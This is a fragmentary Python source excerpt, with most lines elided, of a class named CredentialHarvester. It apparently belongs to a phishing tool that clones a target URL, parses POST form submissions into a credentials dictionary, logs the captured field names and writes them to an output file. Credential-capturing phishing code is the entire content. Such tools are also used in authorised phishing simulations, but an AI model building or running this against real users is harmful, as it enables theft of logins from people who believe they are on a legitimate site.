...
class CredentialHarvester:
    ...
    def __init__(
        ...
        logger.info("Initialized credential harvester")
                    ...
                    try:
                        ...
                        for pair in post_data.split("&"):
                            if "=" in pair:
                                ...
                                credentials[urllib.parse.unquote(key)] = urllib.parse.unquote(
                                    value
                                )
                        ...
                        if harvester.verbose:
                            ...
                            keys = ", ".join(
                                k for k in credentials if k not in ["ip_address", "user_agent"]
                            )
...
def parse_arguments() -> argparse.Namespace:
    ...
    template_group.add_argument("-u", "--url", dest="url", help="URL to clone")
    ...
    parser.add_argument(
        "-o", "--output", dest="output_file", help="File to save captured credentials"
    )
